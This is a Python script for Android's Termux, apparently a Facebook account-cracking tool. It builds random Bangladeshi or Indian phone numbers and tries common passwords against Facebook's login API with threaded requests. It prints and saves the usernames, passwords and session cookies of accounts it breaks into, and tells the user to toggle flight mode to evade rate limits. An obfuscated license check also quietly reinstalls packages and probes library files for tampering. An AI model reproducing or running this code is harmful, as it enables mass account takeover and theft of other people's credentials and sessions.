import os
import sys
import marshal, base64, zlib
from os import path
import os,base64,zlib,pip,urllib
try:
        os.system('clear')
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system('pip install requests futures==2 > /dev/null')
except:pass
#-----------------------[ COLOR-CODE ]-----------------------#
a='\x1b[38;5;118m';b='\x1b[38;5;119m';c='\x1b[38;5;120m';d='\x1b[38;5;121m';e='\x1b[38;5;122m';g='\x1b[38;5;46m';r='\x1b[38;5;196m';w='\033[1;37m'
#-----------------------[ HEXXX-CODE ]-----------------------#
user=[];ok=[];cp=[];twf=[];cpx=[];cokix=[];plist=[];loop=0
#-----------------------[ SC-CODE ]-----------------------#
main_x ='(1) Bd Random \n (2) India random \n (3) Exit menu';bd_x = '017 | 018 | 019';ind_x = '+91639 | +91600 | +91620';line_x = '==================================================';cp_x = 'Do You Went Show Cp Ids (Y|N)';coki_x = 'Do You Went Show Cookies (Y|N)';c = 'Choice'
#-----------------------[ LOGO-CODE ]-----------------------#
logo = f"""
\x1b[38;5;46m.
███╗   ███╗██╗██████╗  █████╗ ███████╗
████╗ ████║██║██╔══██╗██╔══██╗╚══███╔╝
██╔████╔██║██║██████╔╝███████║  ███╔╝ 
██║╚██╔╝██║██║██╔══██╗██╔══██║ ███╔╝  
██║ ╚═╝ ██║██║██║  ██║██║  ██║███████╗
╚═╝     ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
\33[1;92m─────────────────────────────────────────────
\33[1;92m DEVELOPER    \33[1;91m ◉     \x1b[38;5;48mMiraz Ahmed 	 	  
\33[1;92m FACEBOOK \33[1;91m     ◉     \x1b[38;5;208mMiraz Ahmed	 	
\33[1;92m GITHUB     \33[1;91m   ◉    \x1b[38;5;47m SKBER-CYBER\33[1;91m[\33[1;95mMiraz01616\33[1;91m]
\33[1;92m─────────────────────────────────────────────
\33[1;97m\33[42m[\33[1;91mTOOLS\x1b[38;5;208m: \33[1;97mFREE RANDOM CLONING TOOLS VERSION \33[1;95m-11.9\33[1;97m]\x1b[0m
\33[1;92m─────────────────────────────────────────────"""
#-----------------------[ CLEAR-CODE ]-----------------------#
import os,base64,sys,re
try:
    import rich
except:
    os.system("pip install rich")
    import rich
from rich import print as rp
from rich.panel import Panel
from datetime import datetime




K1=str(os.getuid())
K2=str(os.getgid())
num_key="h".join(K1+K2)
cm=num_key.encode("ASCII")
cmr=base64.b64encode(cm)
cm2=str(cmr)
#####KEY NAME ######
kx=cm2.replace("b","JAHID")
####################
key=kx.upper()
##### APPROVE URL #####

url=base64.b64decode(b'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1NLQkVSLUNZQkVSL0NvbnRvbC9tYWluL2FwaS50eHQ=')

######################
main_url=url.decode("ASCII")
all_datA=[]
    #print (logo)


def req(team_elite,main_url):
    try:
        lx=team_elite.get(main_url)
        approved=lx.text
        return approved
    except:
        rp("[bold red] Internet Error")
        sys.exit()

def url_sefty():
    try:
        h=open("/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py","r").read()
        vx=re.search("print",h)
        if vx == None:
            report= "pure_user"
        else:
            report= "bypass_user"
        return report
    except:
         pass

def url_sefty2():
    try:
        h=open("/data/data/com.termux/files/usr/lib/python3.11/site-packages/httpx/_api.py","r").read()
        vx=re.search("print",h)
        if vx == None:
            report= "pure_user"
        else:
            report= "bypass_user"
        return report
    except:
         pass

def key_sefty():
    global key
    try:
        h=open("/data/data/com.termux/files/usr/lib/python3.11/site-packages/httpx/_models.py","r").read()
        vx=re.search(key,h)
        if vx == None:
            report= "pure_user"
        else:
            report= "bypass_user"
        return report
    except:
         pass

def key_sefty2():
    global key
    try:
        h=open("/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py","r").read()
        vx=re.search(key,h)
        if vx == None:
            report= "pure_user"
        else:
            report= "bypass_user"
        return report
    except:
         pass

def lisens():
    global key 
    ky=key.split('\'')[1]
    li=ky[5:15]
    try:
        open("/data/data/com.termux/files/usr/bin/.sifa.txt","r").read()
        expired_ck()
    except:
        while True:
            os.system("clear")
            print(logo)
            xcx=input("License Key =>")
            if xcx == li:
                open("/data/data/com.termux/files/usr/bin/.sifa.txt","a").write("done")
                expired_ck()
                break 
            else:
                continue 
    
def expired_ck():
    global key,all_datA
    tita=str(datetime.now()).split(" ")[0]
    tic=tita.split("-")
    pure_data=int(tic[0]+tic[1]+tic[2])
    for x in all_datA:
        if key in x:
            
            break 
        else:
            continue
    
    HERON=int(x.split("\'|")[1])
    
    if pure_data < HERON:
        menu()
        #print("JAHID")
        
        
        
    else:
        print(" YOUR APPROVAL DATE IS EXPIRED")
    
def uninstall_able():
    try:
        open("/data/data/com.termux/files/usr/bin/pip","r").read()
        open("/data/data/com.termux/files/usr/bin/pip3","r").read()
    except:
        print(" you are useing Ant-uninstall system ")
        sys.exit()

def apv():
    global key,main_url
    uninstall_able()
    if "pure_user" == url_sefty():
        pass
    elif "bypass_user" == url_sefty():
        rp(" Trun off your bypass system")
        sys.exit()
    
    if "pure_user" == url_sefty2():
        pass
    elif "bypass_user" == url_sefty2():
        rp(" Trun off your bypass system")
        sys.exit()
    
    
    if "pure_user" == key_sefty():
        pass
    elif "bypass_user" == key_sefty2():
        rp(" Trun off your bypass system")
        sys.exit()
    if "pure_user" == key_sefty():
        pass
    elif "bypass_user" == key_sefty2():
        rp(" Trun off your bypass system")
        sys.exit()
    
    os.system("pip uninstall httpx requests -y")
    os.system("pip install requests httpx")
    import httpx
    team_elite=httpx.Client() 
    data=req(team_elite,main_url)
    for dta in data.splitlines():
        all_datA.append(dta)
    row=[]
    for r in data.splitlines():
        rx=r.split("|")[0]
        row.append(rx)
    if key not in row:
        os.system("clear")
        logo=(""".

███╗   ███╗██╗██████╗  █████╗ ███████╗
████╗ ████║██║██╔══██╗██╔══██╗╚══███╔╝
██╔████╔██║██║██████╔╝███████║  ███╔╝ 
██║╚██╔╝██║██║██╔══██╗██╔══██║ ███╔╝  
██║ ╚═╝ ██║██║██║  ██║██║  ██║███████╗
╚═╝     ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
                     
 """)
        rp(Panel.fit(" [green]</> KEY "+key, title="[bold yellow]NOT APPROVED", subtitle="[bold blue]GET PERMISSION"))
        #####----Message link
        os.system("xdg-open https://wa.me/+8801917466867")
    else:
        lisens()
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz
def fresh():os.system('clear');print(logo)
#-----------------------[ LINE-CODE ]-----------------------#
def line():print(f'\33[1;92m─────────────────────────────────────────────')
#-----------------------[ MAIN-CODE ]-----------------------#
def Main():
    fresh();
    rp(Panel.fit(" [green]</> KEY "+key, title="[bold yellow]APPROVED DONE", subtitle="[bold blue]GET INJOY"))
    print(f'\x1b[38;5;46m (1) Random Cracking \n (2) Exit Manu ');line()
    manu = input(f'\x1b[38;5;46m (+) {c} : ')
    if manu in ['1','01']:country()
    else:Main()
#-----------------------[ COUNTRY-CODE ]-----------------------#
def country():
    fresh();print(f' {main_x} ');line()
    con_ck = input(f' (+) {c} : ')
    if con_ck in ['1','01']:rndm_bd()
    elif con_ck in ['2','02']:rndm_ind()
    else:Main()
#-----------------------[ RNDM-CODE-BD ]-----------------------#
def rndm_bd():
        fresh();print(f'\x1b[38;5;46m (+) Example : {bd_x} ');line();code = input(f' (+) Find Sim Code : ')
        fresh();print(f'\x1b[38;5;46m (+) Example : 1000 | 2000 | 5000 ');line();limit = int(input(f' (+) Find Limit : '))
        fresh();print(f' (+) {cp_x} ');line();cpy = input(f' (+) {c} (Y|N) : ')
        if cpy in ['n','N','no','NO','2','02']:cpx.append(f'n')
        else:cpx.append(f'y')
        fresh();print(f' (+) {coki_x} ');line();cokiy = input(f' (+) {c} (Y|N) : ')
        if cokiy in ['n','N','no','NO','2','02']:cokix.append(f'n')
        else:cokix.append(f'y')
        for Kid in range(limit):Bhootxx = ''.join(random.choice(string.digits) for _ in range(7));user.append(Bhootxx)
        with tred(max_workers=30) as Tanim:
                tl = str(len(user))
                fresh();print(f' (+) Sim Code    : {code} \n (+) Total Limit : {limit} \n (+) Use Flight Mode Every 5 Minutes...');line()
                for love in user:
                        ids = code + love 
                        pasx = [love,ids,ids[:8],ids[:7],'@@@###','aabbcc','aaabbb','১২৩৪৫৬','১২৩৪৫৬৭৮','102030','405060','708090','803649','jahid12','parver123','12356','11223344','riyad12','jannat','Bangladesh','bangladesh','I Love You','free fire' ]
                        Tanim.submit(rndmx,ids,pasx,tl)
#-----------------------[ RNDM-CODE-INDIA ]-----------------------#
def rndm_ind():
        fresh();print(f' (+) Example : {ind_x}  ');line();code = input(f' (+) Find Sim Code : ')
        fresh();print(f' (+) Example : 1000 | 2000 | 5000 ');line();limit = int(input(f' (+) Find Limit : '))
        fresh();print(f' (+) {cp_x} ');line();cpy = input(f' (+) {c} (Y|N) : ')
        if cpy in ['n','N','no','NO','2','02']:cpx.append(f'n')
        else:cpx.append(f'y')
        fresh();print(f' (+) {coki_x} ');line();cokiy = input(f' (+) {c} (Y|N) : ')
        if cokiy in ['n','N','no','NO','2','02']:cokix.append(f'n')
        else:cokix.append(f'y')
        for Kid in range(limit):Bhootxx = ''.join(random.choice(string.digits) for _ in range(7));user.append(Bhootxx)
        with tred(max_workers=30) as Tanim:
                tl = str(len(user))
                fresh();print(f' (+) Sim Code    : {code} \n (+) Total Limit : {limit} \n (+) Use Flight Mode Every 5 Minutes...');line()
                for love in user:
                        ids = code + love 
                        pasx = ['57575751','57273200','59039200',ids,love,ids[3:]]
                        Tanim.submit(rndmx,ids,pasx,tl)
#-----------------------[ RANDOM-METHOD-CODE ]-----------------------#      
def rndmx(ids,pasx,tl):
        global loop,ok
        sys.stdout.write(f'\r\x1b[38;5;46m [JAHID-CRACK💚]<=>({loop})<=>({len(ok)}<=>{len(cp)})');sys.stdout.flush()
        try:
                for pas in pasx:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        uaddx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/419.0.0.27.57;FBBV/573810848;FBRV/0;FBPN/com.facebook.katana;FBLC/vi_VN;FBMF/Era 2X;FBBD/Era 2X;FBDV/XOLO;FBSV/10;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                        headers = {'User-Agent': uaddx, 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                print(f'\r{g} <=>[JAHID-OK💚] {str(uid)} | {pas}')
                                print('\33[1;92m─────────────────────────────────────────────')
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                if 'y' in cokix:print(f'\r{g}<=>[COOKIES💚] :{w}{coki} ')
                                open('/sdcard/JAHID-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                ok.append(str(uid))
                                break
                        elif 'www.facebook.com' in po['error']['message']: 
                                uid = po['error']['error_data']['uid']
                                if 'y' in cpx:print(f'\r{r} [JAHID-CP] {str(uid)} | {pas} ')
                                open('/sdcard/JAHID-JAHID-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cp.append(str(uid))
                                break
                        else:continue
                loop+=1
        except:pass                        
#-----------------------[ END-CODE ]-----------------------#
Main()
